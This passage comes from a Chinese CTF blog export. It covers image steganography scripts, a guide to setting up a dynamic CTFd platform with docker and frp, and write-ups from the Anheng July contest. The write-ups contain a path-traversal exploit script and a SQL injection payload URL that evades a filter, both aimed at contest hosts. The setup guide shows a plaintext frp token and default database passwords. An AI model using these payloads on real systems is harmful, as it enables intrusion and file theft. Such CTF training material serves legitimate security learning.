class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>可以先用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(image.getpixel((<span class="number">115</span>,<span class="number">55</span>)))</span><br><span class="line">print(image.getpixel((<span class="number">115</span>,<span class="number">145</span>)))</span><br></pre></td></tr></table></figure>

<p>测出(254, 0, 0)为红，(172, 172, 172)为灰，(8, 253, 8)为绿。其中</p>
<p>(115,55)和(115,145)是坐标。</p>
<p>运行脚本即可得到flag。</p>
<h5 id="GIF图片合并"><a href="#GIF图片合并" class="headerlink" title="GIF图片合并"></a><strong>GIF图片合并</strong></h5><p>首先同样用2345看图王分离帧。一共有201帧。</p>
<p>然后观察每张图片的大小：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;C:\\Users\\Think\\Desktop\\glance\\&#x27;</span></span><br><span class="line"></span><br><span class="line">im=Image.open(path+<span class="string">&#x27;glance_1&#x27;</span>+<span class="string">&#x27;.JPG&#x27;</span>)</span><br><span class="line">print(im.size)</span><br></pre></td></tr></table></figure>

<p>运行结果为(2, 600)，可以看出每一帧的宽度为2。高度为600。</p>
<p>思路为：建一张大图，然后将每一帧依次黏贴上去。</p>
<p>编写脚本为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;C:\\Users\\Think\\Desktop\\glance\\&#x27;</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">2</span>*<span class="number">201</span>,<span class="number">600</span>))</span><br><span class="line">width = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">201</span>):</span><br><span class="line">  im.paste(Image.open(path+<span class="string">&#x27;glance_&#x27;</span>+str(i)+<span class="string">&#x27;.JPG&#x27;</span>),(width,<span class="number">0</span>,<span class="number">2</span>+width,<span class="number">600</span>))</span><br><span class="line">  width = width +<span class="number">2</span></span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure>

<h5 id="判断图片颜色"><a href="#判断图片颜色" class="headerlink" title="判断图片颜色"></a><strong>判断图片颜色</strong></h5><p>题目是：</p>
<img src="http://img.kawhi.xyz/image-20200419200921372.png" alt="image-20200419200921372" style="high:80%;width:80%;" />

<p>这里应该是黑色白色对应01，然后转成字符串。</p>
<p>编写脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;C:\\Users\\Think\\Desktop\\gif\\&#x27;</span></span><br><span class="line"></span><br><span class="line">sumDo = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sumNo = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">104</span>):</span><br><span class="line">	<span class="keyword">if</span> Image.open(path+str(i)+<span class="string">&#x27;.jpg&#x27;</span>).getcolors()[<span class="number">0</span>][<span class="number">1</span>][<span class="number">0</span>] == <span class="number">12</span>:</span><br><span class="line">		sumDo +=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">		sumNo +=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sumDo +=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">		sumNo +=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (hex(int(sumDo,<span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>]).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> (hex(int(sumNo,<span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>]).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>即可得到flag。</p>
<h5 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a><strong>LSB隐写</strong></h5><p>LSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位（LSB）</p>
<p>首先来讲png图片，png图片是一种无损压缩的位图片形格式，也只有在无损压缩或者无压缩的图片（BMP）上实现lsb隐写。如果图像是jpg图片的话，就没法使用lsb隐写了，原因是jpg图片对像数进行了有损压缩，我们修改的信息就可能会在压缩的过程中被破坏。而png图片虽然也有压缩，但却是无损压缩，这样我们修改的信息也就能得到正确的表达，不至于丢失。BMP的图片也是一样的，是没有经过压缩的。BMP图片一般是特别的大的，因为BMP把所有的像数都按原样储存，没有进行压缩。</p>
<img src="http://img.kawhi.xyz/image-20200419222005146.png" alt="image-20200419222005146" style="high:80%;width:80%;" />

<p>上图我们可以看到，十进制的235表示的是绿色，我们修改了在二进制中的最低位，但是颜色看起来依旧没有变化。我们就可以修改最低位中的信息，实现信息的隐写。</p>
<p>这里的题目是一张png图片：</p>
<p>LSB是将原本的像素转8位2进制，将8位2进制的左后一位置0或者置1来隐写数据，所以我们可以枚举所有像素，当该位像素最后一位不为0时，置为255的黑点。</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;C:\\Users\\Think\\Desktop\\LSB\\01.png&#x27;</span>)</span><br><span class="line">width,height=img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,width):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,height):</span><br><span class="line">		tmp = img.getpixel((i,j))</span><br><span class="line">		<span class="keyword">if</span> tmp&amp;<span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">			img.putpixel((i,j),<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			img.putpixel((i,j),<span class="number">255</span>)</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>

<p>即可得到一张二维码。扫码即可得到flag。</p>
<img src="http://img.kawhi.xyz/image-20200419222749603.png" alt="image-20200419222749603" style="high:80%;width:80%;" />]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title>搭建动态CTFd</title>
    <url>/2020/07/27/%E6%90%AD%E5%BB%BA%E5%8A%A8%E6%80%81CTFd/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>网上的搭建教程有很多了，但是有几个比较坑的地方的资料比较零散，这里记录一下从零开始搭建的过程，虽然因为各种原因最后还是学贤大佬帮我搭好了🙃，这个动态靶机是真的方便。</p>
<h3 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a><strong>前置工作</strong></h3><p>本篇搭建环境为centos7.6</p>
<p>学贤大佬用的是ubuntu18也搭成功了，但是相对来说还是centos比较方便。</p>
<h4 id="更新yum源"><a href="#更新yum源" class="headerlink" title="更新yum源"></a><strong>更新yum源</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yum update</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yum install -y git nginx mariadb mariadb-server Mysql-python python-pip gcc  python-devel yum-utils device-mapper-persistent-data lvm2 epel-release</span><br></pre></td></tr></table></figure>

<h4 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a><strong>安装docker</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#换源</span></span><br><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"><span class="comment">#查看并选择合适的docker版本</span></span><br><span class="line">yum list docker-ce --showduplicates | sort -r</span><br><span class="line"><span class="comment">#安装docker</span></span><br><span class="line">yum -y install docker-ce</span><br><span class="line"><span class="comment">#查看是否安装成功</span></span><br><span class="line">docker --version</span><br><span class="line"><span class="comment">#启动docker</span></span><br><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>

<h4 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a><strong>安装docker-compose</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yum install python3-pip</span><br><span class="line">pip3 install docker-compose</span><br><span class="line"><span class="comment">#更改二进制文件的权限</span></span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line"><span class="comment">#测试是否安装成功</span></span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>

<h4 id="docker镜像加速"><a href="#docker镜像加速" class="headerlink" title="docker镜像加速"></a><strong>docker镜像加速</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://e5ee9xyr.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<h3 id="安装frp"><a href="#安装frp" class="headerlink" title="安装frp"></a><strong>安装frp</strong></h3><h4 id="下载frp"><a href="#下载frp" class="headerlink" title="下载frp"></a><strong>下载frp</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd</span><br><span class="line">wget https://github.com/fatedier/frp/releases/download/v0<span class="number">.29</span><span class="number">.0</span>/frp_0<span class="number">.29</span><span class="number">.0</span>_linux_amd64.tar.gz</span><br><span class="line">tar -zxvf frp_0<span class="number">.29</span><span class="number">.0</span>_linux_amd64.tar.gz</span><br><span class="line">cd frp_0<span class="number">.29</span><span class="number">.0</span>_linux_amd64</span><br><span class="line">cp systemd/* /etc/systemd/system/</span><br><span class="line">mkdir /etc/frp</span><br><span class="line">cp frpc.ini  frps.ini /etc/frp/</span><br><span class="line">cp frpc  frps /usr/bin/</span><br><span class="line">chmod a+x /usr/bin/frpc /usr/bin/frps</span><br><span class="line">systemctl enable frps</span><br></pre></td></tr></table></figure>

<p>FRP的文件wget太慢的话，可以下载后再直接拖到root的目录下。</p>
<h4 id="修改frps-ini"><a href="#修改frps-ini" class="headerlink" title="修改frps.ini"></a><strong>修改<code>frps.ini</code></strong></h4><p>修改<code>frps.ini</code>内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vim /etc/frp/frps.ini</span><br></pre></td></tr></table></figure>

<p><code>frps.ini</code>的内容如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = <span class="number">7897</span></span><br><span class="line">bind_addr = <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">token = jplXcUyxdqn0y2RIzaLTDoaXET5Gbo78</span><br></pre></td></tr></table></figure>

<p>启动frps系统服务</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">systemctl start frps</span><br></pre></td></tr></table></figure>

<h4 id="修改frpc-ini"><a href="#修改frpc-ini" class="headerlink" title="修改frpc.ini"></a><strong>修改<code>frpc.ini</code></strong></h4><p>修改<code>frpc.ini</code>配置文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vim /etc/frp/frpc.ini</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">server_port = <span class="number">7897</span></span><br><span class="line">token = jplXcUyxdqn0y2RIzaLTDoaXET5Gbo78</span><br></pre></td></tr></table></figure>

<p>再修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vim ~/frp_0<span class="number">.29</span><span class="number">.0</span>_linux_amd64/frpc.ini</span><br></pre></td></tr></table></figure>

<p><code>frpc.ini</code>的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span> <span class="comment"># 这里填写宿主机ifconfig之后docker0的ip</span></span><br><span class="line">server_port = <span class="number">7897</span></span><br><span class="line">token = jplXcUyxdqn0y2RIzaLTDoaXET5Gbo78</span><br><span class="line">admin_addr = <span class="number">172.20</span><span class="number">.0</span><span class="number">.2</span> <span class="comment">#这里填写frpc容器在frpcadmin网络里的ip</span></span><br><span class="line">admin_port = <span class="number">7400</span></span><br><span class="line">log_file = ./frps.log</span><br></pre></td></tr></table></figure>

<h4 id="创建网络frpadmin"><a href="#创建网络frpadmin" class="headerlink" title="创建网络frpadmin"></a><strong>创建网络frpadmin</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建网络并启动frpc容器并配置frpc.ini</span></span><br><span class="line">docker network create ctfd_frp-containers</span><br><span class="line">docker run  -d -v ~/frp_0<span class="number">.29</span><span class="number">.0</span>_linux_amd64/frpc.ini:/etc/frp/frpc.ini --network=<span class="string">&quot;ctfd_frp-containers&quot;</span> --restart=always <span class="string">&quot;glzjin/frp&quot;</span></span><br><span class="line"><span class="comment">#创建网络frpcadmin用于ctfd容器和frpc容器通信</span></span><br><span class="line">docker network create frpcadmin</span><br><span class="line">docker network connect frpcadmin &lt;frpc容器名或者ID&gt;</span><br><span class="line"><span class="comment">#重启docker服务</span></span><br><span class="line">systemctl restart docker</span><br><span class="line"><span class="comment">#查看frpcadmin网络的连接情况并记录frpc容器的网络IP</span></span><br><span class="line">docker network inspect frpcadmin</span><br></pre></td></tr></table></figure>

<h4 id="token脚本"><a href="#token脚本" class="headerlink" title="token脚本"></a><strong>token脚本</strong></h4><hr>
<p>这里有个可以生成token的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>():</span></span><br><span class="line">    length_r = <span class="number">32</span></span><br><span class="line">    token = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    chars = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">    length = len(chars) - <span class="number">1</span></span><br><span class="line">    random = Random()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length_r):</span><br><span class="line">        token += chars[random.randint(<span class="number">0</span>, length)]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"><span class="keyword">print</span> get_token()</span><br></pre></td></tr></table></figure>

<h3 id="安装CTFd"><a href="#安装CTFd" class="headerlink" title="安装CTFd"></a><strong>安装CTFd</strong></h3><h4 id="下载CTFd"><a href="#下载CTFd" class="headerlink" title="下载CTFd"></a><strong>下载CTFd</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd</span><br><span class="line">git clone https://github.com/CTFd/CTFd.git</span><br><span class="line">cd CTFd/</span><br><span class="line"><span class="comment">#回滚到当前教程适合的版本</span></span><br><span class="line">git reset <span class="number">6</span>c5c63d667a17aec159c8e26ea53dccfbc4d0fa3 --hard</span><br><span class="line"><span class="comment">#打开ctfd插件目录</span></span><br><span class="line">cd CTFd/plugins</span><br><span class="line">git clone https://github.com/glzjin/CTFd-Whale.git ctfd-whale</span><br><span class="line">cd ctfd-whale</span><br><span class="line"><span class="comment">#回滚到当前教程适合的版本</span></span><br><span class="line">git reset <span class="number">5</span>b32f457e9f56ee9b2b29495f4b3b118be3c57bd --hard</span><br><span class="line"><span class="comment">#返回ctfd主目录</span></span><br><span class="line">cd ../../../</span><br></pre></td></tr></table></figure>

<p>把原生的CTFd装好后改一下这个css，这一步非常重要，因为原本的网站被墙了，导致访问非常慢，所以需要换一下cdn加速版本的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd /root/CTFd/CTFd/themes/core/static/css/vendor/font-awesome</span><br><span class="line"><span class="comment">#打开fontawesome-fonts.css</span></span><br><span class="line"><span class="comment">#把第一句换成</span></span><br><span class="line"><span class="meta">@import url(&#x27;https://cdn.bootcss.com/font-awesome/5.13.0/css/all.css&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>然后换一下这三个文件</p>
<h4 id="修改Dockerfile"><a href="#修改Dockerfile" class="headerlink" title="修改Dockerfile"></a><strong>修改<code>Dockerfile</code></strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">FROM python:<span class="number">2.7</span>-alpine</span><br><span class="line">RUN sed -i <span class="string">&#x27;s/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g&#x27;</span> /etc/apk/repositories &amp;&amp;\</span><br><span class="line">    apk update &amp;&amp; \</span><br><span class="line">    apk add python python-dev linux-headers libffi-dev gcc make musl-dev py-pip mysql-client git openssl-dev</span><br><span class="line">RUN adduser -D -u <span class="number">1001</span> -s /bin/bash ctfd</span><br><span class="line"></span><br><span class="line">WORKDIR /opt/CTFd</span><br><span class="line">RUN mkdir -p /opt/CTFd /var/log/CTFd /var/uploads</span><br><span class="line">RUN pip config set <span class="keyword">global</span>.index-url https://pypi.doubanio.com/simple</span><br><span class="line">RUN pip config set install.trusted-host pypi.doubanio.com</span><br><span class="line">COPY requirements.txt .</span><br><span class="line"></span><br><span class="line">RUN pip install -r requirements.txt -i  https://pypi.doubanio.com/simple</span><br><span class="line"></span><br><span class="line">COPY . /opt/CTFd</span><br><span class="line"></span><br><span class="line">RUN <span class="keyword">for</span> d <span class="keyword">in</span> CTFd/plugins/*; do \</span><br><span class="line">      <span class="keyword">if</span> [ -f <span class="string">&quot;$d/requirements.txt&quot;</span> ]; then \</span><br><span class="line">        pip install -r $d/requirements.txt -i  https://pypi.doubanio.com/simple; \</span><br><span class="line">      fi; \</span><br><span class="line">    done;</span><br><span class="line"></span><br><span class="line">RUN chmod +x /opt/CTFd/docker-entrypoint.sh</span><br><span class="line">RUN chown -R <span class="number">1001</span>:<span class="number">1001</span> /opt/CTFd</span><br><span class="line">RUN chown -R <span class="number">1001</span>:<span class="number">1001</span> /var/log/CTFd /var/uploads</span><br><span class="line"></span><br><span class="line">USER <span class="number">1001</span></span><br><span class="line">EXPOSE <span class="number">8000</span></span><br><span class="line">ENTRYPOINT [<span class="string">&quot;/opt/CTFd/docker-entrypoint.sh&quot;</span>]</span><br></pre></td></tr></table></figure>

<h4 id="修改docker-compose-yml"><a href="#修改docker-compose-yml" class="headerlink" title="修改docker-compose.yml"></a><strong>修改<code>docker-compose.yml</code></strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  ctfd:</span><br><span class="line">    build: .</span><br><span class="line">    user: root</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;8000:8000&quot;</span></span><br><span class="line">    environment:</span><br><span class="line">      - UPLOAD_FOLDER=/var/uploads</span><br><span class="line">      - DATABASE_URL=mysql+pymysql://root:ctfd@db/ctfd</span><br><span class="line">      - REDIS_URL=redis://cache:<span class="number">6379</span></span><br><span class="line">      - WORKERS=<span class="number">1</span></span><br><span class="line">      - LOG_FOLDER=/var/log/CTFd</span><br><span class="line">      - ACCESS_LOG=-</span><br><span class="line">      - ERROR_LOG=-</span><br><span class="line">    volumes:</span><br><span class="line">      - .data/CTFd/logs:/var/log/CTFd</span><br><span class="line">      - .data/CTFd/uploads:/var/uploads</span><br><span class="line">      - .:/opt/CTFd:ro</span><br><span class="line">      - /var/run/docker.sock:/var/run/docker.sock</span><br><span class="line">    depends_on:</span><br><span class="line">      - db</span><br><span class="line">    networks:</span><br><span class="line">        default:</span><br><span class="line">        internal:</span><br><span class="line"></span><br><span class="line">  db:</span><br><span class="line">    image: mariadb:<span class="number">10.4</span><span class="number">.12</span></span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_ROOT_PASSWORD=ctfd</span><br><span class="line">      - MYSQL_USER=ctfd</span><br><span class="line">      - MYSQL_PASSWORD=ctfd</span><br><span class="line">      - MYSQL_DATABASE=ctfd</span><br><span class="line">    volumes:</span><br><span class="line">      - .data/mysql:/var/lib/mysql</span><br><span class="line">    networks:</span><br><span class="line">        internal:</span><br><span class="line">    <span class="comment"># This command is required to set important mariadb defaults</span></span><br><span class="line">    command: [mysqld, --character-set-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=<span class="number">28800</span>, --log-warnings=<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  cache:</span><br><span class="line">    image: redis:<span class="number">4</span></span><br><span class="line">    restart: always</span><br><span class="line">    volumes:</span><br><span class="line">    - .data/redis:/data</span><br><span class="line">    networks:</span><br><span class="line">        internal:</span><br><span class="line"></span><br><span class="line">networks:</span><br><span class="line">    default:</span><br><span class="line">    internal:</span><br><span class="line">        internal: true</span><br></pre></td></tr></table></figure>

<h4 id="修改requirements-txt"><a href="#修改requirements-txt" class="headerlink" title="修改requirements.txt"></a><strong>修改<code>requirements.txt</code></strong></h4><p>在最下面添加一行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">banal==<span class="number">0.4</span><span class="number">.2</span></span><br></pre></td></tr></table></figure>

<p>构建启动镜像。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>将ctfd连接frpcadmin网络</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker network connect frpcadmin &lt;ctfd容器名或者ID&gt;</span><br><span class="line">docker network inspect frpcadmin</span><br></pre></td></tr></table></figure>

<h3 id="插件信息填写"><a href="#插件信息填写" class="headerlink" title="插件信息填写"></a><strong>插件信息填写</strong></h3><p>进入网站插件填写信息即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Docker API URL</span></span><br><span class="line">unix:///var/run/docker.sock</span><br><span class="line"><span class="comment">#Frp API IP</span></span><br><span class="line"><span class="number">172.20</span><span class="number">.0</span><span class="number">.2</span>  <span class="comment">#frpc容器在frpcadmin网络里的ip</span></span><br><span class="line"><span class="comment">#Frp API Port</span></span><br><span class="line"><span class="number">7400</span></span><br><span class="line"><span class="comment">#Frp Http Domain Suffix</span></span><br><span class="line"><span class="literal">None</span></span><br><span class="line"><span class="comment">#Frp Http Port </span></span><br><span class="line"><span class="number">80</span></span><br><span class="line"><span class="comment">#Frp Direct IP Address</span></span><br><span class="line"><span class="number">39.105</span><span class="number">.158</span><span class="number">.221</span>  <span class="comment">#公网IP</span></span><br><span class="line"><span class="comment">#Frp Direct Minimum Port </span></span><br><span class="line"><span class="number">28000</span></span><br><span class="line"><span class="comment">#Frp Direct Maximum Port </span></span><br><span class="line"><span class="number">28100</span></span><br><span class="line"><span class="comment">#Max Container Count </span></span><br><span class="line"><span class="number">100</span>         <span class="comment">#最大容器数</span></span><br><span class="line"><span class="comment">#Max Renewal Times </span></span><br><span class="line"><span class="number">5</span>           <span class="comment">#单个容器最大续期次数</span></span><br><span class="line"><span class="comment">#Frp config template </span></span><br><span class="line">[common]</span><br><span class="line">server_addr = <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">server_port = <span class="number">7897</span></span><br><span class="line">token = jplXcUyxdqn0y2RIzaLTDoaXET5Gbo78</span><br><span class="line">admin_addr = <span class="number">172.20</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line">admin_port = <span class="number">7400</span></span><br><span class="line">log_file = ./frps.log</span><br><span class="line"><span class="comment">#Docker Auto Connect Containers </span></span><br><span class="line"><span class="literal">None</span></span><br><span class="line"><span class="comment">#Docker Auto Connect Network </span></span><br><span class="line">ctfd_frp-containers</span><br><span class="line"><span class="comment">#Docker Dns Setting </span></span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>

<h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a><strong>常见问题</strong></h3><p>如果容器的状态为restart，可以用logs来查看发生了什么错误</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">docker logs &lt;容器ID&gt;</span><br></pre></td></tr></table></figure>

<h3 id="部署web题目"><a href="#部署web题目" class="headerlink" title="部署web题目"></a><strong>部署web题目</strong></h3><p>在Dockerfile里面填写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">FROM php:<span class="number">7.0</span>-apache</span><br><span class="line">CMD sh -c <span class="string">&quot;echo $FLAG &gt; /flag  &amp;&amp; export FLAG=not_flag &amp;&amp; FLAG=not_flag &amp;&amp; apache2-foreground&quot;</span></span><br></pre></td></tr></table></figure>

<p>即可生成动态flag</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
  </entry>
  <entry>
    <title>安恒七月赛</title>
    <url>/2020/07/26/%E5%AE%89%E6%81%92%E4%B8%83%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>就几道题，水一下</p>
<h3 id="ezfileinclude"><a href="#ezfileinclude" class="headerlink" title="ezfileinclude"></a><strong>ezfileinclude</strong></h3><p>打开题目链接后显示出来的是一张图片，查看网页源代码会在img标签种发现一个/image.php?t=xxxxx&amp;f=base64(xxxx)</p>
<p>这道题目考点也是文件读取，所以利用点肯定在f这个参数了，但只是过滤了开头的<code>../</code></p>
<p>这里用一下Hhhm师傅的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;hhhm/../../../../../../../../flag&quot;</span></span><br><span class="line">file = base64.b64encode(file.encode())</span><br><span class="line">url = <span class="string">&quot;http://183.129.189.60:10009/image.php?t=&#123;0&#125;&amp;f=&#123;1&#125;&quot;</span></span><br><span class="line">now = int(time.time())</span><br><span class="line">rep = requests.get(url.format(str(now),file.decode()))</span><br><span class="line">print(rep.text)</span><br></pre></td></tr></table></figure>

<p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;t&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you miss some parameters&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $timestamp = time();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(abs($_GET[<span class="string">&#x27;t&#x27;</span>] - $timestamp) &gt; <span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;what&#x27;s your time?&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $file = base64_decode($_GET[<span class="string">&#x27;f&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;/../&quot;</span>)) === <span class="string">&quot;/../&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;../&quot;</span>)) === <span class="string">&quot;../&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;./&quot;</span>)) === <span class="string">&quot;./&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;/.&quot;</span>)) === <span class="string">&quot;/.&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;//&quot;</span>)) === <span class="string">&quot;//&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You are not allowed to do that.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/var/www/html/img/&#x27;</span>.$file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Sqil"><a href="#Sqil" class="headerlink" title="Sqil"></a><strong>Sqil</strong></h3><p>首先fuzz之后发现正则</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/;|benchmark|\^|if|[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;|like|-|`/i&quot;</span>, $id);</span><br></pre></td></tr></table></figure>

<p>发现过滤in和or被过滤了，意味着information_schema不能使用</p>
<p>一般来说绕过information有两种</p>
<ul>
<li>sys.x$schema_flattened_keys</li>
<li>sys.schema_table_statistics_with_buffer</li>
</ul>
<p>但是第二种里的stat被过滤了，可以使用第一种方法，注出表名payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10004/?id=0%27/**/union/**/select/**/1,2,group_concat(table_name)from/**/sys.x$schema_flattened_keys/**/where/**/table_schema=database()%23</span><br></pre></td></tr></table></figure>

<p>回显</p>
